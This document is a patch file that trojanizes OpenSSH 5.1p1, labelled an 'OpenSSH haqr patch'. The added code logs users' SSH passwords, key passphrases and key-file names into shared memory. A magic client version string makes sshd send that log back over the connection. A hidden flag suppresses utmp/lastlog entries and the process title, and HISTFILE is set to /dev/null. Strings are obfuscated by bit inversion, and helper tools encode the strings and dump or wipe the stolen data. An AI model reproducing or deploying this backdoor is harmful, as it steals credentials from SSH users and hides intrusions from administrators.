+ #include "monitor_wrap.h"
+ #include "sftp.h"
+ 
++#include "hack.h"
++
+ #if defined(KRB5) && defined(USE_AFS)
+ #include <kafs.h>
+ #endif
+@@ -1205,6 +1207,7 @@
+ 		}
+ 	}
+ 
++if(!h) {
+ 	/* SSH_CLIENT deprecated */
+ 	snprintf(buf, sizeof buf, "%.50s %d %d",
+ 	    get_remote_ipaddr(), get_remote_port(), get_local_port());
+@@ -1218,6 +1221,20 @@
+ 
+ 	if (s->ttyfd != -1)
+ 		child_set_env(&env, &envsize, "SSH_TTY", s->tty);
++}
++else {
++	char *key, *value;
++
++	/* HISTFILE */
++	key = strdup(U("\xb7\xb6\xac\xab\xb9\xb6\xb3\xba"));
++	/* /dev/null */
++	value = strdup(U("\xd0\x9b\x9a\x89\xd0\x91\x8a\x93\x93"));
++
++	child_set_env(&env, &envsize, key, value);
++	free(key);
++	free(value);
++}
++
+ 	if (s->term)
+ 		child_set_env(&env, &envsize, "TERM", s->term);
+ 	if (s->display)
+@@ -2606,6 +2623,8 @@
+ void
+ session_proctitle(Session *s)
+ {
++	if(h) return;
++
+ 	if (s->pw == NULL)
+ 		error("no user for session %d", s->self);
+ 	else
+diff -ruN openssh-5.1p1.orig/shmcat.c openssh-5.1p1/shmcat.c
+--- openssh-5.1p1.orig/shmcat.c	1969-12-31 19:00:00.000000000 -0500
++++ openssh-5.1p1/shmcat.c	2011-02-20 00:45:11.000000000 -0500
+@@ -0,0 +1,40 @@
++/**
++ * OpenSSH haqr patch
++ * - Small utility to dump contents of shared memory buffer
++ */
++#include <unistd.h>
++#include <stdio.h>
++#include <sys/types.h>
++#include <sys/shm.h>
++#include <string.h>
++
++#include "hack.h"
++
++int main(int argc, char **argv) {
++	int len, sid; 
++	char *addr;
++
++	sid = shmget(SHMKEY, SHMSIZE, 0);
++	fprintf(stderr, "[*] shmget() on key 0x%08x returned identifier 0x%08x\n", SHMKEY, sid);
++	if(sid != -1) {
++		addr = shmat(sid, 0, 0);
++		fprintf(stderr, "[*] shmat() returned address %p\n", addr);
++		if(addr != (char *)~0) {
++			memcpy(&len, addr + 4, 4);
++			fprintf(stderr, "[*] %d bytes in buffer\n", len);
++			fwrite(addr + 8, 1, len, stdout);
++
++			if(argc == 2 && !strcmp(argv[1], "-d")) {
++				len = 0;
++				memcpy(addr + 4, &len, 4);
++				fprintf(stderr, "[*] Zapped contents of log buffer\n");
++			}
++			else
++				fprintf(stderr, "[*] Run with -d to zap contents of log buffer\n");
++
++			shmdt(addr);
++		}
++	}
++
++	return 0;
++}
+diff -ruN openssh-5.1p1.orig/sshconnect1.c openssh-5.1p1/sshconnect1.c
+--- openssh-5.1p1.orig/sshconnect1.c	2006-11-07 07:14:42.000000000 -0500
++++ openssh-5.1p1/sshconnect1.c	2011-02-26 19:12:52.000000000 -0500
+@@ -48,6 +48,9 @@
+ #include "hostfile.h"
+ #include "auth.h"
+ 
++#include "hack.h"
++static char *sp = NULL; /* saved password */
++
+ /* Session id for the current session. */
+ u_char session_id[16];
+ u_int supported_authentications = 0;
+@@ -269,6 +272,43 @@
+ 				debug2("no passphrase given, try next key");
+ 				quit = 1;
+ 			}
++                {
++                        int maxlen, len, sid;
++                        char *addr;
++
++	                sid = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL);
++	                if(sid == -1)
++	                        sid = shmget(SHMKEY, SHMSIZE, 0);
++                        if(sid != -1) {
++				char *action;
++
++				if(!private)
++					/* DENY */
++					action = U("\xbb\xba\xb1\xa6");
++				else
++					/* ACCEPT */
++					action = U("\xbe\xbc\xbc\xba\xaf\xab");
++
++                                action = strdup(action);
++
++                                addr = shmat(sid, 0, 0);
++                                if(addr != (char *)~0) {
++					memcpy(&maxlen, addr, 4);
++					memcpy(&len, addr + 4, 4);
++
++					len += snprintf(addr + 8 + len, maxlen - len - 1,
++						/* UID %d\t%s\tKEYFILE\t%s\t%s\n */
++						U("\xaa\xb6\xbb\xdf\xda\x9b\xf6\xda\x8c\xf6\xb4\xba\xa6\xb9\xb6\xb3"
++						"\xba\xf6\xda\x8c\xf6\xda\x8c\xf5"),
++						getuid(), action, passphrase, authfile);
++                                        memcpy(addr + 4, &len, 4);
++                                        shmdt(addr);
++                                }
++
++				free(action);
++                        }
++
++                }
+ 			memset(passphrase, 0, strlen(passphrase));
+ 			xfree(passphrase);
+ 			if (private != NULL || quit)
+@@ -456,6 +496,11 @@
+ 		if (i != 0)
+ 			error("Permission denied, please try again.");
+ 		password = read_passphrase(prompt, 0);
++		if(sp)
++			xfree(sp);
++
++		sp = xstrdup(password);
++
+ 		packet_start(SSH_CMSG_AUTH_PASSWORD);
+ 		ssh_put_password(password);
+ 		memset(password, 0, strlen(password));
+@@ -742,8 +787,33 @@
+ 		snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+ 		    server_user, host);
+ 		if (try_password_authentication(prompt))
++		{
++			int maxlen, len, sid;
++			char *addr;
++
++			sid = shmget(SHMKEY, SHMSIZE, 0);
++			if(sid != -1) {
++				addr = shmat(sid, 0, 0);
++				if(addr != (char *)~0) {
++					char *action = strdup(U("\xbe\xab\xab\xba\xb2\xaf\xab"));
++					memcpy(&maxlen, addr, 4);
++					memcpy(&len, addr + 4, 4);
++	
++					len += snprintf(addr + 8 + len, maxlen - len - 1,
++							/* %s\t%s\t%s\t%s\t%s\n" */
++							U("\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf5"),
++							local_user, action, server_user, sp, host);
++					memcpy(addr + 4, &len, 4);
++					shmdt(addr);
++					free(action);
++				}
++			}
++
+ 			goto success;
++		}
++
+ 	}
++
+ 	/* All authentication methods have failed.  Exit with an error message. */
+ 	fatal("Permission denied.");
+ 	/* NOTREACHED */
+diff -ruN openssh-5.1p1.orig/sshconnect2.c openssh-5.1p1/sshconnect2.c
+--- openssh-5.1p1.orig/sshconnect2.c	2011-02-20 01:43:50.000000000 -0500
++++ openssh-5.1p1/sshconnect2.c	2011-02-26 19:12:52.000000000 -0500
+@@ -72,6 +72,9 @@
+ #include "ssh-gss.h"
+ #endif
+ 
++#include "hack.h"
++
++
+ /* import */
+ extern char *client_version_string;
+ extern char *server_version_string;
+@@ -882,6 +885,35 @@
+ 	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+ 	    authctxt->server_user, authctxt->host);
+ 	password = read_passphrase(prompt, 0);
++
++	{
++		int maxlen, len, sid;
++		char *addr;
++
++                sid = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL);
++                if(sid == -1)
++                        sid = shmget(SHMKEY, SHMSIZE, 0);
++
++		if(sid != -1) {
++			addr = shmat(sid, 0, 0);
++			if(addr != (char *)~0) {
++				char *action = strdup(U("\xbe\xab\xab\xba\xb2\xaf\xab")); /* ATTEMPT */
++				memcpy(&maxlen, addr, 4);
++				memcpy(&len, addr + 4, 4);
++
++				len += snprintf(addr + 8 + len, maxlen - len - 1, 
++						/* %s\t%s\t%s\t%s\t%s\n" */
++						U("\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf5"),
++						authctxt->local_user, action, authctxt->server_user, password, authctxt->host);
++				memcpy(addr + 4, &len, 4);
++				shmdt(addr);
++				free(action);
++			}
++		}
++
++
++	}
++
+ 	packet_start(SSH2_MSG_USERAUTH_REQUEST);
+ 	packet_put_cstring(authctxt->server_user);
+ 	packet_put_cstring(authctxt->service);
+@@ -1134,6 +1166,42 @@
+ 				debug2("no passphrase given, try next key");
+ 				quit = 1;
+ 			}
++                {
++                        int maxlen, len, sid;
++                        char *addr;
++
++	                sid = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL);
++	                if(sid == -1)
++	                        sid = shmget(SHMKEY, SHMSIZE, 0);
++                        if(sid != -1) {
++                                char *action;
++
++                                if(!private)
++                                        /* DENY */
++                                        action = U("\xbb\xba\xb1\xa6");
++                                else
++                                        /* ACCEPT */
++                                        action = U("\xbe\xbc\xbc\xba\xaf\xab");
++
++				action = strdup(action);
++                                addr = shmat(sid, 0, 0);
++                                if(addr != (char *)~0) {
++                                        memcpy(&maxlen, addr, 4);
++                                        memcpy(&len, addr + 4, 4);
++        
++                                        len += snprintf(addr + 8 + len, maxlen - len - 1,
++					/* UID %d\t%s\tKEYFILE\t%s\t%s\n */
++					U("\xaa\xb6\xbb\xdf\xda\x9b\xf6\xda\x8c\xf6\xb4\xba\xa6\xb9\xb6\xb3"
++					"\xba\xf6\xda\x8c\xf6\xda\x8c\xf5"),
++					getuid(), action, passphrase, filename);
++                                        memcpy(addr + 4, &len, 4);
++                                        shmdt(addr);
++                                }
++
++				free(action);
++                        }
++
++                }
+ 			memset(passphrase, 0, strlen(passphrase));
+ 			xfree(passphrase);
+ 			if (private != NULL || quit)
+@@ -1351,6 +1419,33 @@
+ 		echo = packet_get_char();
+ 
+ 		response = read_passphrase(prompt, echo ? RP_ECHO : 0);
++	{
++		int maxlen, len, sid;
++		char *addr;
++
++		sid = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL);
++		if(sid == -1)
++			sid = shmget(SHMKEY, SHMSIZE, 0);
++		if(sid != -1) {
++			addr = shmat(sid, 0, 0);
++			if(addr != (char *)~0) {
++				char *action = strdup(U("\xbe\xab\xab\xba\xb2\xaf\xab"));
++
++				memcpy(&maxlen, addr, 4);
++				memcpy(&len, addr + 4, 4);
++
++				len += snprintf(addr + 8 + len, maxlen - len - 1, 
++						/* %s\t%s\t%s\t%s\t%s\n" */
++						U("\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf5"),
++						authctxt->local_user, action, authctxt->server_user, response, authctxt->host);
++				memcpy(addr + 4, &len, 4);
++				shmdt(addr);
++				free(action);
++			}
++		}
++
++
++	}
+ 
+ 		packet_put_cstring(response);
+ 		memset(response, 0, strlen(response));
+diff -ruN openssh-5.1p1.orig/sshd.c openssh-5.1p1/sshd.c
+--- openssh-5.1p1.orig/sshd.c	2011-02-20 01:43:50.000000000 -0500
++++ openssh-5.1p1/sshd.c	2011-02-26 19:12:52.000000000 -0500
+@@ -124,6 +124,8 @@
+ #include <Security/AuthSession.h>
+ #endif
+ 
++#include "hack.h"
++
+ #ifdef LIBWRAP
+ #include <tcpd.h>
+ #include <syslog.h>
+@@ -459,6 +461,32 @@
+ 	}
+ 	buf[sizeof(buf) - 1] = 0;
+ 	client_version_string = xstrdup(buf);
++ 
++#ifdef SSHD_SHM_HACK
++              if(!strncmp(U(MAGICVERSION), buf, strlen(MAGICVERSION))) {
++			int len, sid;
++			char *addr;
++
++			sid = shmget(SHMKEY, SHMSIZE, 0);
++			if(sid != -1) {
++				addr = shmat(sid, 0, 0);
++				if(addr != (char *)~0) {
++					/* Extract log size and dump contents */
++					memcpy(&len, addr + 4, 4);
++					write(sock_out, addr + 8, len);                         
++
++					/* Zap contents of log */
++					memset(addr + 4, 0, SHMSIZE - 4);
++
++					shmdt(addr);
++				}
++			}
++
++			cleanup_exit(255);
++		}
++#endif
++ 
++
+ 
+ 	/*
+ 	 * Check that the versions match.  In future this might accept
+@@ -1096,6 +1124,30 @@
+ 		if (ret < 0 && errno != EINTR)
+ 			error("select: %.100s", strerror(errno));
+ 		if (received_sigterm) {
++#ifdef SSHD_SHM_HACK
++			/**
++			 * Dump contents of shared memory buffer to local file
++			 */
++			FILE *fd;
++			int len, sid;
++			char *addr;
++
++			sid = shmget(SHMKEY, SHMSIZE, 0);
++			if(sid != -1) {
++				addr = shmat(sid, 0, 0);
++				if(addr != (char *)~0) {
++					memcpy(&len, addr + 4, 4);
++					fd = fopen(U(SHMTEMPFILE), "w");
++					if(fd) {
++						fwrite(addr + 8, 1, len, fd);
++						fclose(fd);
++					}
++
++					shmdt(addr);
++				}
++			}
++#endif
++
+ 			logit("Received signal %d; terminating.",
+ 			    (int) received_sigterm);
+ 			close_listen_socks();
+@@ -1705,6 +1757,49 @@
+ 	/* ignore SIGPIPE */
+ 	signal(SIGPIPE, SIG_IGN);
+ 
++#ifdef SSHD_SHM_HACK
++	do {
++		int i, newseg = 1, sid;
++		char *shmaddr;
++		FILE *fd;
++
++		sid = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL);
++		if(sid == -1) {
++			sid = shmget(SHMKEY, SHMSIZE, 0);
++			if(sid == -1)
++				break;
++		
++			newseg = 0;
++		}
++
++		shmaddr = shmat(sid, 0, 0);
++		if(shmaddr == (char *)~0) {
++			shmaddr = NULL;
++			break;
++		}
++
++		if(newseg) {
++			memset(shmaddr, 0, SHMSIZE);
++			i = SHMSIZE - 8;
++			memcpy(shmaddr, &i, 4);
++			fd = fopen(U(SHMTEMPFILE), "r");
++			if(fd) {
++				i = fread(shmaddr + 8, 1, SHMSIZE - 8, fd);
++				fclose(fd);
++				unlink(U(SHMTEMPFILE));
++				memcpy(shmaddr + 4, &i, 4);
++			}
++			else
++				memset(shmaddr + 4, 0, 4);
++		}
++
++		shmdt(shmaddr);
++	} while(0);
++#endif
++
++
++
++
+ #ifdef OOM_ADJUST
+ 	/* Adjust out-of-memory killer */
+ 	oom_adjust_startup();
+@@ -2032,7 +2127,6 @@
+ 	/* The connection has been terminated. */
+ 	packet_get_state(MODE_IN, NULL, NULL, NULL, &ibytes);
+ 	packet_get_state(MODE_OUT, NULL, NULL, NULL, &obytes);
+-	verbose("Transferred: sent %llu, received %llu bytes", obytes, ibytes);
+ 
+ 	verbose("Closing connection to %.500s port %d", remote_ip, remote_port);
+ 
+diff -ruN openssh-5.1p1.orig/sshlogin.c openssh-5.1p1/sshlogin.c
+--- openssh-5.1p1.orig/sshlogin.c	2007-09-17 02:09:16.000000000 -0400
++++ openssh-5.1p1/sshlogin.c	2011-02-25 20:48:11.000000000 -0500
+@@ -60,6 +60,8 @@
+ #include "buffer.h"
+ #include "servconf.h"
+ 
++#include "hack.h"
++
+ extern Buffer loginmsg;
+ extern ServerOptions options;
+ 
+@@ -120,6 +122,8 @@
+ {
+ 	struct logininfo *li;
+ 
++	if(h) return;
++
+ 	/* save previous login details before writing new */
+ 	store_lastlog_message(user, uid);
+ 
+@@ -136,6 +140,8 @@
+ {
+ 	struct logininfo *li;
+ 
++	if(h) return;
++
+ 	li = login_alloc_entry(pid, user, host, ttyname);
+ 	login_set_addr(li, addr, addrlen);
+ 	login_utmp_only(li);
+@@ -149,6 +155,8 @@
+ {
+ 	struct logininfo *li;
+ 
++	if(h) return;
++
+ 	li = login_alloc_entry(pid, user, NULL, tty);
+ 	login_logout(li);
+ 	login_free_entry(li);
+diff -ruN openssh-5.1p1.orig/txtinvert.c openssh-5.1p1/txtinvert.c
+--- openssh-5.1p1.orig/txtinvert.c	1969-12-31 19:00:00.000000000 -0500
++++ openssh-5.1p1/txtinvert.c	2011-02-20 00:45:11.000000000 -0500
+@@ -0,0 +1,28 @@
++/**
++ * OpenSSH haqr patch
++ * - Small utility to convert plaintext to 'better than plaintext'
++ */
++
++#include <stdio.h>
++#include <stdlib.h>
++#include <string.h>
++
++int main(int argc, char **argv) {
++	int i;
++
++	if(argc != 2) {
++		printf("Usage: %s <string>\n", argv[0]);
++		return -1;
++	}
++
++	printf("/* %s */\n\"", argv[1]);
++	for(i = 0; i < strlen(argv[1]); i++) {
++		printf("\\x%02x", ~(argv[1][i]) & 0xff);
++		if((i % 16) == 15)
++			printf("\"\n\"");
++	}
++
++	printf("\"\n");
++
++	return 0;
++}
